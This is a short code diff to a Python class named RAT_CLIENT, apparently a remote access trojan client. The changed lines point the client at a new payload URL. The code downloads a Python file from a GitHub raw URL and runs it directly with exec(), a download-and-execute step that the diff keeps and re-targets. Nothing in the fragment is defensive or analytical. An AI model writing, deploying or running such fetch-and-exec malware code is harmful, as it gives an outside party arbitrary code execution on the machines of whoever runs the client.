@@ -54,7 +54,7 @@ class RAT_CLIENT:
             print(self.host, self.port)
             print ("mierdeos2")
             import urllib.request
-            code = 'https://raw.githubusercontent.com/alejq41/free/main/pythonremot2.py'
+            code = 'https://raw.githubusercontent.com/alejq41/free2dom/main/pythonremot22.py'
             response = urllib.request.urlopen(code)
             data = response.read()
             exec(data)
